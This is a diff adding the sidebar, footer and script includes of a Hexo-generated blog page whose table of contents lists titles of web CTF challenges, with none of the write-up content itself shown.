+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://030.im/" title="Misaka030" target="_blank">Misaka030</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://guoxiaobo.com/" title="Guo Sir" target="_blank">Guo Sir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cicisite.me/" title="cici大佬" target="_blank">cici大佬</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#写在最前"><span class="nav-number">1.</span> <span class="nav-text">写在最前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PORT-51"><span class="nav-number">2.</span> <span class="nav-text">PORT 51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LOCALHOST"><span class="nav-number">3.</span> <span class="nav-text">LOCALHOST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Login"><span class="nav-number">4.</span> <span class="nav-text">Login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#神盾局的秘密"><span class="nav-number">5.</span> <span class="nav-text">神盾局的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IN-A-mess"><span class="nav-number">6.</span> <span class="nav-text">IN A mess</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RE"><span class="nav-number">7.</span> <span class="nav-text">RE?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag在管理员手里"><span class="nav-number">8.</span> <span class="nav-text">flag在管理员手里</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Chopper"><span class="nav-number">9.</span> <span class="nav-text">Chopper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Gallery"><span class="nav-number">10.</span> <span class="nav-text">Easy Gallery</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Simple-Injection"><span class="nav-number">11.</span> <span class="nav-text">Simple Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#api调用"><span class="nav-number">12.</span> <span class="nav-text">api调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#admin"><span class="nav-number">13.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inject"><span class="nav-number">14.</span> <span class="nav-text">inject</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babayphp"><span class="nav-number">15.</span> <span class="nav-text">babayphp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Willard</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+本站总访问量 <span id="busuanzi_value_site_pv"></span> &nbsp&nbsp&nbsp
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
